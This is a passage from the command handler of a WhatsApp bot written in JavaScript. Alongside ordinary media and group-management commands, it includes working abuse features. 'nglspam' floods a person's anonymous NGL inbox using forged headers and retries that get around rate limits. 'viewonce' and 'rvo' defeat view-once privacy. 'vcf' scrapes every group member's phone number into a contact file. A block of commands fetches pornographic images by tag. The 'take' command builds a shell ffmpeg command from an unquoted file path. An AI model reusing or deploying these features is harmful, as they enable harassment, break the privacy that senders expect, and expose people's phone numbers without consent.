                await dave.sendMessage(m.chat, { video: { url: item.url }, caption: '🎥 Video downloaded successfully.' }, { quoted: m });
            } else {
                await reply(`⚠️ Unsupported media type: ${mime}`);
            }
        }
    } catch (err) {
        reply(`❌ Error: ${err.message}`);
    }
}
break

case 'faceblur': 
case 'blurface': {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    if (!mime.startsWith('image/')) return reply(`⚠️ Please reply to an image.`);

    try {
        const media = await dave.downloadAndSaveMediaMessage(q);
        const response = await CatBox(media);
        await dave.sendMessage(
            m.chat,
            { image: { url: `https://api.siputzx.my.id/api/iloveimg/blurface?image=${response}` }, caption: footer },
            { quoted: m }
        );
        await fs.promises.unlink(media).catch(() => {});
    } catch (err) {
        reply(`❌ Error applying blur: ${err.message}`);
    }
}
break

case 'neko':
case 'shinobu':
case 'megumin':
case 'bully':
case 'cuddle':
case 'cry':
case 'hug':
case 'awoo':
case 'kiss':
case 'lick':
case 'pat':
case 'smug':
case 'bonk':
case 'yeet':
case 'blush':
case 'smile':
case 'wave':
case 'highfive':
case 'handhold':
case 'nom':
case 'bite':
case 'glomp':
case 'slap':
case 'kill':
case 'happy':
case 'wink':
case 'poke':
case 'dance':
case 'cringe':
case 'trap':
case 'blowjob':
case 'hentai':
case 'boobs':
case 'ass':
case 'pussy':
case 'thighs':
case 'lesbian':
case 'lewdneko':
case 'cum': {
    if (!daveshown && !isPremium) return reply('❌ This command is for Premium users only.');
    reply("🔄 Loading...");

    try {
        let data = await fetchJson(`https://rule34.xxx/index.php?page=dapi&s=post&q=index&tags=${command}&json=1`);
        if (data && data[0]?.file_url) {
            return await dave.sendMessage(
                m.chat,
                { image: { url: data[0].file_url }, caption: footer },
                { quoted: m }
            );
        }

        let nsfw = await fetchJson(`https://api.waifu.pics/nsfw/${command}`);
        if (nsfw?.url) {
            return await dave.sendMessage(
                m.chat,
                { image: { url: nsfw.url }, caption: footer },
                { quoted: m }
            );
        }

        let sfw = await fetchJson(`https://api.waifu.pics/sfw/${command}`);
        if (sfw?.url) {
            return await dave.sendMessage(
                m.chat,
                { image: { url: sfw.url }, caption: footer },
                { quoted: m }
            );
        }

        reply("❌ Sorry, no result found for that tag.");
    } catch (err) {
        console.error(err);
        reply("⚠️ Failed to fetch image. Try again later.");
    }
}
break

case 'imagebing':
case 'bingimage':
case 'imgbing':
case 'bingimg': {
    if (!args.length) return reply('❌ Please provide a prompt.\nExample: .imgbing red sports car');

    const query = encodeURIComponent(args.join(' '));
    const url = `https://beta.anabot.my.id/api/ai/bingImgCreator?prompt=${query}&apikey=freeApikey`;

    try {
        await dave.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        const res = await fetch(url);
        const data = await res.json();

        if (data.status !== 200 || !data.data?.result?.length)
            return reply('⚠️ No images found for your prompt!');

        for (const img of data.data.result) {
            await dave.sendMessage(
                m.chat,
                { image: { url: img }, caption: `🎨 Generated Image` },
                { quoted: m }
            );
        }

        await dave.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error(err);
        reply('❌ Error fetching image: ' + (err.message || err.toString()));
    }
}
break

case 'autorecordtype': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`)
    if (q === 'on') {
        autorecordtype = true
        reply(`✅ Successfully turned *auto recording & typing* ${q}`)
    } else if (q === 'off') {
        autorecordtype = false
        reply(`✅ Successfully turned *auto recording & typing* ${q}`)
    } else {
        reply(`Usage: ${prefix + command} on/off`)
    }
}
break

case "desc": 
case "setdesc": { 
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply("bot must be admin in this group")
    if (!text) throw 'Provide the text for the group description' 
    await dave.groupUpdateDescription(m.chat, text); 
    m.reply('Group description successfully updated! 🥶'); 
} 
break

case "setnamebot":
case "setbotname": {
    if (!daveshown) return reply(mess.owner);
    if (!text) return reply(`Where is the name?\nExample: ${prefix + command} 𝘿𝙖𝙫𝙚𝘼𝙄`);
    
    await dave.updateProfileName(text);
    global.botname = text;
    global.packname = text;
    global.footer = text;
    reply(`Successfully changed the bot's profile name to *${text}*`);
}
break

case "setbiobot":
case "setbotbio": {
    if (!daveshown) return reply(mess.owner);
    if (!text) return reply(`Where is the text?\nExample: ${prefix + command} 𝘿𝙖𝙫𝙚𝘼𝙄`);
    
    await dave.updateProfileStatus(text);
    global.caption = text;
    global.footer = text;
    reply(`Successfully changed the bot's bio to:\n*${text}*`);
}
break

case "delppbot": {
    if (!daveshown) return reply(mess.owner);
    
    await dave.removeProfilePicture(dave.user.id);
    reply(`🗑️ Successfully deleted the bot's profile picture`);
}
break

case 'removal':
case 'removebackground': {
  if (!quoted) return reply(`Where's the photo?`);
  if (!/image/.test(mime)) return reply(`Send or reply to an image with caption ${prefix + command}`);

  await dave.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } });

  await reply('Please wait, your process has started...\n\n⏳ This may take some time, please be patient.');

  let media = await dave.downloadAndSaveMediaMessage(quoted);
  try {
    let catBoxUrl = await CatBox(media);
    fs.unlinkSync(media);

    await dave.sendMessage(
      m.chat,
      {
        image: {
          url: `https://api.siputzx.my.id/api/iloveimg/removebg?image=${encodeURIComponent(catBoxUrl)}`
        },
        caption: footer
      },
      { quoted: m }
    );
  } catch (error) {
    console.error(error);
    reply('❌ Error processing HD image.');
  }
}
break

case 'save': {
  try {
    const quotedMessage = m.msg?.contextInfo?.quotedMessage;

    if (!quotedMessage) {
      return m.reply('Please reply to a status message');
    }

    if (!m.quoted?.chat?.endsWith('@broadcast')) {
      return m.reply('That message is not a status! Please reply to a status message.');
    }

    const mediaBuffer = await dave.downloadMediaMessage(m.quoted);
    if (!mediaBuffer || mediaBuffer.length === 0) {
      return m.reply('Could not download the status media. It may have expired.');
    }

    let payload;
    let mediaType;

    if (quotedMessage.imageMessage) {
      mediaType = 'image';
      payload = {
        image: mediaBuffer,
        caption: quotedMessage.imageMessage.caption || '📸 Saved status image',
        mimetype: 'image/jpeg'
      };
    } 
    else if (quotedMessage.videoMessage) {
      mediaType = 'video';
      payload = {
        video: mediaBuffer,
        caption: quotedMessage.videoMessage.caption || '🎥 Saved status video',
        mimetype: 'video/mp4'
      };
    } 
    else {
      return m.reply('Only image and video statuses can be saved!');
    }

    await dave.sendMessage(
      m.sender, 
      payload,
      { quoted: m }
    );

    return m.reply(`✅  ${mediaType} Saved by 𝘿𝙖𝙫𝙚𝘼𝙄!`);

  } catch (error) {
    console.error('Save error:', error);
    if (error.message.includes('404') || error.message.includes('not found')) {
      return m.reply('The status may have expired or been deleted.');
    }
    return m.reply('❌ Failed to save status. Error: ' + error.message);
  }
}
break

case 'playdoc': {
    try {
        const tempDir = path.join(__dirname, "temp");
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);

        if (!args.length) return reply(`Provide a song name!\nExample: ${command} Not Like Us`);

        const query = args.join(" ");
        if (query.length > 100) return reply(`Song name too long! Max 100 chars.`);

        await reply("Searching for the track...");

        const searchResult = await (await yts(`${query} official`)).videos[0];
        if (!searchResult) return reply("Couldn't find that song. Try another one!");

        const video = searchResult;
        const apiUrl = `https://api.privatezia.biz.id/api/downloader/ytmp3?url=${encodeURIComponent(video.url)}`;
        const response = await axios.get(apiUrl);
        const apiData = response.data;

        if (!apiData.status || !apiData.result || !apiData.result.downloadUrl) throw new Error("API failed to fetch track!");

        const timestamp = Date.now();
        const fileName = `audio_${timestamp}.mp3`;
        const filePath = path.join(tempDir, fileName);

        const audioResponse = await axios({
            method: "get",
            url: apiData.result.downloadUrl,
            responseType: "stream",
            timeout: 600000
        });

        const writer = fs.createWriteStream(filePath);
        audioResponse.data.pipe(writer);
        await new Promise((resolve, reject) => {
            writer.on("finish", resolve);
            writer.on("error", reject);
        });

        if (!fs.existsSync(filePath) || fs.statSync(filePath).size === 0)
            throw new Error("Download failed or empty file!");

        await dave.sendMessage(
            from,
            { text: `Downloaded ${apiData.result.title || video.title}` },
            { quoted: m }
        );

        await dave.sendMessage(
            from,
            {
                document: { url: filePath },
                mimetype: "audio/mpeg",
                fileName: `${(apiData.result.title || video.title).substring(0, 100)}.mp3`
            },
            { quoted: m }
        );

        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);

    } catch (error) {
        console.error("Play command error:", error);
        return reply(`Error: ${error.message}`);
    }
}
break

case 'joingc':
case 'join': {
  if (!daveshown) return reply(mess.owner);
  if (!text) return reply("Where's the group link?");
  if (!text.includes("chat.whatsapp.com")) return reply("Invalid WhatsApp group link!");
  let result = text.split('https://chat.whatsapp.com/')[1];
  let id = await dave.groupAcceptInvite(result);
  reply(`✅ Successfully joined group: ${id}`);
}
break

case "tojs":
case "q": {
  if (!daveshown) return reply(mess.owner);
  if (!m.quoted) return reply("Reply to a message!");
  let jsonData = JSON.stringify(m.quoted, null, 2);
  reply(jsonData);
}
break

case "viewonce":
case "openviewonce": {
  if (!daveshown) return reply(mess.owner);
  if (!m.quoted) return reply("Reply to a view-once message!");

  let msg =
    m?.quoted?.message?.imageMessage ||
    m?.quoted?.message?.videoMessage ||
    m?.quoted?.message?.audioMessage ||
    m?.quoted;

  if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce)
    return reply("That message is not a view-once message!");

  const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
  let media = await downloadContentFromMessage(
    msg,
    msg.mimetype == 'image/jpeg'
      ? 'image'
      : msg.mimetype == 'video/mp4'
      ? 'video'
      : 'audio'
  );

  let type = msg.mimetype;
  let buffer = Buffer.from([]);
  for await (const chunk of media) buffer = Buffer.concat([buffer, chunk]);

  if (/video/.test(type)) {
    return dave.sendMessage(m.chat, { video: buffer, caption: msg.caption || "" }, { quoted: m });
  } else if (/image/.test(type)) {
    return dave.sendMessage(m.chat, { image: buffer, caption: msg.caption || "" }, { quoted: m });
  } else if (/audio/.test(type)) {
    return dave.sendMessage(m.chat, { audio: buffer, mimetype: "audio/mpeg", ptt: true }, { quoted: m });
  }
}
break

case 'sendchat': {
  if (!daveshown) return reply(mess.owner);
  if (!text) return reply(`Example: ${prefix + command} Hello | 2547XXXXXXXX | https://example.com`);

  let [messageText, targetNumber] = text.split('|').map(v => v.trim());
  if (!messageText) messageText = '';
  if (!targetNumber) return reply('❌ Target number missing');

  const targetJid = `${targetNumber}@s.whatsapp.net`;

  try {
    let thumbBuffer = null;
    if (global.thumb) {
      try {
        thumbBuffer = Buffer.from(await (await fetch(global.thumb)).arrayBuffer());
      } catch {}
    }

    await dave.sendMessage(targetJid, {
      text: messageText,
      ...(thumbBuffer ? { thumbnail: thumbBuffer } : {})
    });

    reply('✅ Successfully sent the message');
  } catch (err) {
    console.error(err);
    reply('❌ Failed to send message');
  }
}
break

case "nglspam": {
  if (!daveshown) return reply(mess.owner);

  if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
    return reply("Enter username, message, and spam amount!\nExample: .nglspam sjasj|hello|5");
  }

  async function sendSpamMessage(username, message, spamCount) {
    let counter = 0;
    while (counter < spamCount) {
      try {
        const date = new Date();
        const formattedTime = `${date.getHours()}:${date.getMinutes()}`;
        const deviceId = crypto.randomBytes(21).toString("hex");
        const url = "https://ngl.link/api/submit";
        const headers = {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.5",
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "X-Requested-With": "XMLHttpRequest",
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-origin",
          Referer: `https://ngl.link/${username}`,
          Origin: "https://ngl.link"
        };

        const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;

        const response = await fetch(url, {
          method: "POST",
          headers,
          body,
          mode: "cors",
          credentials: "include"
        });

        if (response.status !== 200) {
          console.log(`[${formattedTime}] [Error] Rate-limited`);
          await new Promise(res => setTimeout(res, 25000));
        } else {
          counter++;
          console.log(`[${formattedTime}] [Sent] Message #${counter}`);
        }
      } catch (error) {
        console.error(`[Error] ${error}`);
        await new Promise(res => setTimeout(res, 5000));
      }
    }
  }

  const [username, message, count] = text.split("|");
  const spamCount = parseInt(count, 10);
  if (isNaN(spamCount) || spamCount <= 0) {
    return reply("Spam count must be a positive number!");
  }

  try {
    await sendSpamMessage(username, message, spamCount);
    reply(`✅ Successfully sent ${spamCount} NGL messages to ${username}`);
  } catch (e) {
    console.error(e);
    reply("❌ An error occurred, please try again later.");
  }
}
break

case 'uploadstatus':
case 'tostatus':
case 'gcsw':
case 'upwsgc':
case 'upswtag': {
  if (!daveshown) return reply(mess.owner);
  if (!quoted) return reply(`Quote a message (image, video, or audio) with caption ${prefix + command}`);

  let argsText = text.split(',').map(a => a.trim());
  if (argsText.length < 2) return reply(`Example: ${prefix + command} groupID, caption`);

  let target = argsText[0];
  let caption = argsText.slice(1).join(',');

  const type = Object.keys(quoted.message)[0];

  const stream = await dave.downloadContentFromMessage(quoted.message[type], type.replace('Message', ''));
  let buffer = Buffer.from([]);
  for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

  let sendOptions = {};
  if (type.includes('image')) sendOptions = { image: buffer, caption };
  else if (type.includes('video')) sendOptions = { video: buffer, caption };
  else if (type.includes('audio')) sendOptions = { audio: buffer, mimetype: 'audio/mp4', ptt: true };
  else return reply('❌ Unsupported media type!');

  await dave.sendMessage(target + '@g.us', sendOptions, {
    contextInfo: { mentionedJid: [target + '@s.whatsapp.net'] }
  });

  reply('✅ Successfully uploaded status with mention!');
}
break

case 'tovoicenote': {
  try {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const ffmpeg = require('fluent-ffmpeg');
    const fs = require('fs');
    const path = require('path');
    const { tmpdir } = require('os');

    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const msg = (quotedMsg && (quotedMsg.videoMessage || quotedMsg.audioMessage))
                || m.message?.videoMessage
                || m.message?.audioMessage;

    if (!msg) return reply("Reply to a video or audio to convert it to a voice note!");

    const mime = msg.mimetype || '';
    if (!/video|audio/.test(mime)) return reply("Only works on video or audio messages!");

    reply("Converting to voice note...");

    const messageType = mime.split("/")[0];
    const stream = await downloadContentFromMessage(msg, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    const inputPath = path.join(tmpdir(), `input_${Date.now()}.mp4`);
    const outputPath = path.join(tmpdir(), `output_${Date.now()}.ogg`);
    fs.writeFileSync(inputPath, buffer);

    await new Promise((resolve, reject) => {
      ffmpeg(inputPath)
        .inputOptions('-t 59')
        .toFormat('opus')
        .outputOptions(['-c:a libopus', '-b:a 64k'])
        .on('end', resolve)
        .on('error', reject)
        .save(outputPath);
    });

    const audioBuffer = fs.readFileSync(outputPath);
    await dave.sendMessage(from, { audio: audioBuffer, mimetype: 'audio/ogg', ptt: true }, { quoted: m });

    fs.unlinkSync(inputPath);
    fs.unlinkSync(outputPath);

    reply("Voice note sent!");
  } catch (err) {
    console.error("tovoicenote error:", err);
    reply("Failed to convert media to voice note. Ensure it is a valid video/audio file.");
  }
}
break

case 'toimage': {
  try {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const fs = require('fs');
    const path = require('path');
    const { tmpdir } = require('os');
    const sharp = require('sharp');

    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const stickerMsg = (quotedMsg && quotedMsg.stickerMessage) || m.message?.stickerMessage;

    if (!stickerMsg || !stickerMsg.mimetype?.includes('webp')) {
      return reply("Reply to a sticker to convert it to an image!");
    }

    m.reply("Converting sticker to image...");

    const stream = await downloadContentFromMessage(stickerMsg, 'sticker');
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    const outputPath = path.join(tmpdir(), `sticker_${Date.now()}.png`);
    await sharp(buffer).png().toFile(outputPath);

    const imageBuffer = fs.readFileSync(outputPath);
    await dave.sendMessage(from, { image: imageBuffer }, { quoted: m });

    fs.unlinkSync(outputPath);
    reply("Sticker converted to image!");
  } catch (err) {
    console.error("toimage error:", err);
    reply("Failed to convert sticker to image.");
  }
}
break

case "listcase": {
  if (!daveshown) return reply(mess.owner);
  const code = fs.readFileSync('dave.js', 'utf8');
  const regex = /case\s+["'`](.+?)["'`]\s*:/g;
  let match;
  const cases = [];
  while ((match = regex.exec(code)) !== null) cases.push(match[1]);
  return reply(`
*Total Cases:* ${cases.length}

> ${cases.join("\n> ")}
`);
}
break

case "disp-90": { 
    if (!m.isGroup) return reply(mess.group); 
    if (!isAdmins) return reply(mess.admin); 
    await dave.groupToggleEphemeral(m.chat, 90*24*3600); 
    m.reply('Dissapearing messages successfully turned on for 90 days!'); 
} 
break

case "disp-off": { 
    if (!m.isGroup) return reply(mess.group); 
    if (!isAdmins) return reply(mess.admin); 
    await dave.groupToggleEphemeral(m.chat, 0); 
    m.reply('Dissapearing messages successfully turned off!'); 
}
break

case "disp-1": { 
    if (!m.isGroup) return reply(mess.group); 
    if (!isAdmins) return reply(mess.admin); 
    await dave.groupToggleEphemeral(m.chat, 1*24*3600); 
    m.reply('Dissapearing messages successfully turned on for 24hrs!'); 
} 
break

case 'autotyping': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
    if (q == 'on') {
        db.data.settings[botNumber].autoTyping = true
        reply(`Successfully Changed Auto Typing To ${q}`)
    } else if (q == 'off') {
        db.data.settings[botNumber].autoTyping = false
        reply(`Successfully Changed Auto Typing To ${q}`)
    }
}
break

case 'reactch':
case 'rch': { 
  if (!daveshown) return reply(mess.owner)
  if (!text) return reply(`Example:\n${prefix + command} https://whatsapp.com/channel/xxx/123 ❤️dave\n${prefix + command} https://whatsapp.com/channel/xxx/123 ❤️dave|5`)

  const fancyText = {
    a:'🅐',b:'🅑',c:'🅒',d:'🅓',e:'🅔',f:'🅕',g:'🅖',h:'🅗',i:'🅘',j:'🅙',k:'🅚',l:'🅛',m:'🅜',n:'🅝',o:'🅞',p:'🅟',q:'🅠',r:'🅡',s:'🅢',t:'🅣',u:'🅤',v:'🅥',w:'🅦',x:'🅧',y:'🅨',z:'🅩',
    '0':'⓿','1':'➊','2':'➋','3':'➌','4':'➍','5':'➎','6':'➏','7':'➐','8':'➑','9':'➒'
  }

  const [mainText, offsetStr] = text.split('|')
  const args = mainText.trim().split(' ')
  const link = args[0]

  if (!link.includes('https://whatsapp.com/channel/'))
    return reply(`Invalid link!\nExample: ${prefix + command} https://whatsapp.com/channel/xxx/id ❤️dave|3`)

  const channelId = link.split('/')[4]
  const rawMessageId = parseInt(link.split('/')[5])
  if (!channelId || isNaN(rawMessageId)) return reply('Incomplete link!')

  const offset = parseInt(offsetStr?.trim()) || 1
  const plainText = args.slice(1).join(' ')
  const emojiText = plainText.replace(link, '').trim()
  if (!emojiText) return reply('Enter text/emoji to react with.')

  const emoji = emojiText.toLowerCase().split('').map(c => fancyText[c] || c).join('')

  try {
    const metadata = await dave.newsletterMetadata('invite', channelId)
    let success = 0, failed = 0

    for (let i = 0; i < offset; i++) {
      const msgId = (rawMessageId - i).toString()
      try {
        await dave.newsletterReactMessage(metadata.id, msgId, emoji)
        success++
      } catch {
        failed++
      }
    }
    reply(`✅ Successfully reacted *${emoji}* to ${success} messages in *${metadata.name}*\n❌ Failed on ${failed} messages`)
  } catch (err) {
    console.error(err)
    reply('❌ Failed to process your request!')
  }
}
break

case 'clearchat':
case 'clear': { 
  if (!daveshown) return reply(mess.owner)
  await dave.chatModify({ 
    delete: true, 
    lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] 
  }, m.chat)
  reply('Chat successfully cleared!')
}
break

case 'rvo':
case 'readviewonce': { 
  if (!daveshown) return reply(mess.owner)
  if (!m.quoted) return reply('Reply to a view-once message!')

  let msg = m?.quoted?.message?.imageMessage || 
            m?.quoted?.message?.videoMessage || 
            m?.quoted?.message?.audioMessage || 
            m?.quoted
  if (!msg.viewOnce && m.quoted.mtype !== 'viewOnceMessageV2') return reply('That's not a view-once message!')

  const { downloadContentFromMessage } = require('@whiskeysockets/baileys')
  let media = await downloadContentFromMessage(msg, /image/.test(msg.mimetype) ? 'image' : /video/.test(msg.mimetype) ? 'video' : 'audio')
  let buffer = Buffer.from([])
  for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])

  if (/video/.test(msg.mimetype)) return dave.sendMessage(m.chat, { video: buffer, caption: msg.caption || '' }, { quoted: m })
  else if (/image/.test(msg.mimetype)) return dave.sendMessage(m.chat, { image: buffer, caption: msg.caption || '' }, { quoted: m })
  else if (/audio/.test(msg.mimetype)) return dave.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })
}
break

case 'listgc': { 
  if (!daveshown) return reply(mess.owner)
  try {
    const getGroups = await dave.groupFetchAllParticipating()
    const groups = Object.values(getGroups)
    if (!groups.length) return reply('❌ The bot is not in any groups.')

    let text = `⬣ *GROUP LIST ${botname.toUpperCase()}*\n📊 Total Groups: ${groups.length}\n\n`

    groups.forEach((g, i) => {
      const groupId = g.id
      const groupName = g.subject
      const memberCount = g.participants?.length || 0
      const created = moment(g.creation * 1000).tz('Africa/Nairobi').format('DD/MM/YYYY HH:mm')

      text += `*${i + 1}. ${groupName}*\n🆔 ID: ${groupId}\n👥 Members: ${memberCount}\n🕐 Created: ${created}\n\n`
    })

    await dave.sendMessage(
      m.chat,
      { text },
      { quoted: m }
    )
  } catch (err) {
    console.error(err)
    reply('❌ Failed to fetch group data.')
  }
}
break

case 'listowner':
case 'listown': {
    if (!daveshown) return reply(mess.owner)

    if (owner.length < 1) return reply('❌ No additional owners found.')

    let text = `🌟 *#- List of All Additional Owners*\n\n`
    owner.forEach((o, index) => {
        let num = index + 1
        let user = o.split('@')[0]
        text += `🔹 *${num}.* ${user}\n    *Tag:* @${user}\n\n`
    })

    dave.sendMessage(m.chat, { text, mentions: owner }, { quoted: m })
}
break

case 'onlygroup':
case 'onlygc': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example ${prefix + command} on / off`)
    if (q == 'on') {
        db.data.settings[botNumber].onlygrub = true
        reply(`Successfully Changed Onlygroup To ${q}`)
    } else if (q == 'off') {
        db.data.settings[botNumber].onlygrub = false
        reply(`Successfully Changed Onlygroup To ${q}`)
    }
}
break

case 'onlypc': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
    if (q == 'on') {
        db.data.settings[botNumber].onlypc = true
        reply(`Successfully Changed Onlypc To ${q}`)
    } else if (q == 'off') {
        db.data.settings[botNumber].onlypc = false
        reply(`Successfully Changed Onlypc To ${q}`)
    }
}
break

case 'unavailable': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
    if (q === 'on') {
        db.data.settings[botNumber].online = true
        reply(`Successfully changed unavailable to ${q}`)
    } else if (q === 'off') {
        db.data.settings[botNumber].online = false
        reply(`Successfully changed unavailable to ${q}`)
    }
}
break

case 'antilink': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins && !daveshown) return reply(mess.admins)
    if (args.length < 1) return reply('on/off?')
    if (args[0] === 'on') {
        db.data.chats[from].antilink = true
        reply(`${command} is enabled`)
    } else if (args[0] === 'off') {
        db.data.chats[from].antilink = false
        reply(`${command} is disabled`)
    }
}
break

case 'antilinkgc': {
    if (!m.isGroup) return m.reply(mess.group)
    if (!isAdmins && !daveshown) return m.reply(mess.owner)
    if (args.length < 1) return m.reply('on/off?')
    if (args[0] === 'on') {
        db.data.chats[from].antilinkgc = true
        m.reply(`${command} is enabled`)
    } else if (args[0] === 'off') {
        db.data.chats[from].antilinkgc = false
        m.reply(`${command} is disabled`)
    }
}
break

case 'statuscheck':
case 'checkstatus': {
    if (!daveshown) return reply(mess.owner);

    const viewStatus = global.AUTOVIEWSTATUS ? '✅ Enabled' : '❌ Disabled';
    const reactStatus = global.AREACT ? '✅ Enabled' : '❌ Disabled';

    reply(`Auto Status Settings:\n\n👀 Auto View: ${viewStatus}\n💫 Auto React: ${reactStatus}`);
}
break

case 'autostatus':
case 'statusview': {
    if (!daveshown) return reply(mess.owner);
    if (!args[0]) return reply('Usage: on/off');
    const mode = args[0].toLowerCase();

    try {
        let settings = {};
        if (fs.existsSync(settingsPath)) {
            delete require.cache[require.resolve(settingsPath)];
            settings = require(settingsPath);
        }

        if (mode === 'on') {
            global.AUTOVIEWSTATUS = true;
            settings.AUTOVIEWSTATUS = true;
            reply('Auto view status enabled');
        } else if (mode === 'off') {
            global.AUTOVIEWSTATUS = false;
            settings.AUTOVIEWSTATUS = false;
            reply('Auto view status disabled');
        } else {
            return reply('Invalid option, use "on" or "off"');
        }

        fs.writeFileSync(
            settingsPath,
            `module.exports = ${JSON.stringify(settings, null, 2)};`,
            'utf8'
        );
    } catch (err) {
        console.error(err);
        reply('Failed to update settings!');
    }
}
break

case 'areact': {
    if (!daveshown) return reply(mess.owner);
    if (!args[0]) return reply('❌ Usage: on/off');
    const mode = args[0].toLowerCase();

    try {
        let settings = {};
        if (fs.existsSync(settingsPath)) {
            delete require.cache[require.resolve(settingsPath)];
            settings = require(settingsPath);
        }

        if (mode === 'on') {
            global.AREACT = true;
            settings.AREACT = true;
            reply('Auto react enabled');
        } else if (mode === 'off') {
            global.AREACT = false;
            settings.AREACT = false;
            reply('Auto react disabled');
        } else {
            return reply('❌ Invalid option, use "on" or "off"');
        }

        fs.writeFileSync(
            settingsPath,
            `module.exports = ${JSON.stringify(settings, null, 2)};`,
            'utf8'
        );
    } catch (err) {
        console.error(err);
        reply('❌ Failed to update settings!');
    }
}
break

case 'unwarning':
case 'unwarn': {
    if (!m.isGroup) return reply(mess.owner)
    if (!isAdmins) return reply(mess.admin)

    let users = m.mentionedJid[0] ?
        m.mentionedJid[0] :
        m.quoted ?
        m.quoted.sender :
        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

    if (!users) return reply(`Tag/Reply target${command}`)
    if (daveshown) return reply('feature reserved for owner or sudo numbers only')

    if (!db.data.chats[m.chat].warn) db.data.chats[m.chat].warn = {}

    if (!db.data.chats[m.chat].warn[users] || db.data.chats[m.chat].warn[users] === 0) {
        return reply(`User is already in the warning list.`)
    }

    db.data.chats[m.chat].warn[users] -= 1

    const sisa = db.data.chats[m.chat].warn[users]

    dave.sendTextWithMentions(m.chat, `✅ Success *${command}* @${users.split('@')[0]}\nRemoved Warning: ${sisa}/${setting.warnCount}`, m)
    if (db.data.chats[m.chat].warn[users] === 0) {
        delete db.data.chats[m.chat].warn[m.sender];
    }
}
break

case 'ch': {
  try {
    const carouselCards = [
      {
        image: trashpic,                          
        title: "Card 1",
        description: "This is card 1",
        id: "card_1"
      },
      {
        image: trashpic,
        title: "Card 2",
        description: "This is card 2",
        id: "card_2"
      },
      {
        image: trashpic,                        
        title: "Card 3",
        description: "This is card 3",
        id: "card_3"
      }
    ];

    const cards = carouselCards.map(card => ({
      image: {
        link: card.image
      },
      title: card.title,
      subtitle: card.description
    }));

    await dave.relayMessage(from, {
      template: {
        type: "media",
        media: {
          type: "image",
          image: {
            link: cards[0].image.link
          }
        },
        carousel: cards
      }
    }, { quoted: m });

  } catch (error) {
    console.error("Error sending carousel:", error);
  }
}
break

case 'take': {
    const { Sticker, StickerTypes } = require('wa-sticker-formatter');
    const fs = require('fs');
    const { exec } = require('child_process');

    let msgR = m.quoted ? m.quoted : m;
    if (!msgR) return reply('Quote an image, a short video, or a sticker to change watermark.');

    let media;
    let isVideo = false;

    if (msgR.imageMessage) {
        media = msgR.imageMessage;
    } else if (msgR.videoMessage) {
        media = msgR.videoMessage;
        isVideo = true;
    } else if (msgR.stickerMessage) {
        media = msgR.stickerMessage;
    } else {
        return reply('This is neither a sticker, image, nor a video.');
    }

    let filePath = await dave.downloadAndSaveMediaMessage(media);

    if (isVideo) {
        let tempOutput = `./temp_${Date.now()}.webp`;
        await new Promise((resolve, reject) => {
            exec(
                `ffmpeg -y -i ${filePath} -vf "scale=512:512:force_original_aspect_ratio=decrease,fps=15,format=rgba" -t 10 ${tempOutput}`,
                (err) => {
                    fs.unlinkSync(filePath);
                    if (err) return reject(err);
                    resolve();
                }
            );
        });
        filePath = tempOutput;
    }

    const sticker = new Sticker(filePath, {
        pack: pushname,
        author: pushname,
        type: StickerTypes.FULL,
        categories: ["🤩", "🎉"],
        id: "12345",
        quality: 70,
        background: "transparent",
    });

    const buffer = await sticker.toBuffer();
    await dave.sendMessage(m.chat, { sticker: buffer }, { quoted: m });

    fs.unlinkSync(filePath);
}
break

case "vcf": 
case "group-vcf": {
    if (!m.isGroup) return m.reply("❌ This command can only be used in groups.");

    const fs = require("fs");
    let gcdata = await dave.groupMetadata(m.chat)
    let gcmem = participants.map(a => a.id)

    let vcard = ''
    let noPort = 0

    for (let a of gcdata.participants) {
        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
    }

    let cont = './contacts.vcf'

    await m.reply('⏳ 𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝗙𝗿𝗼𝘀𝘁 𝗶𝘀 𝗖𝗼𝗺𝗽𝗶𝗹𝗶𝗻𝗴 '+gcdata.participants.length+' 𝗖𝗼𝗻𝘁𝗮𝗰𝘁𝘀 𝗶𝗻𝘁𝗼 𝗮 𝗩𝗰𝗳...');
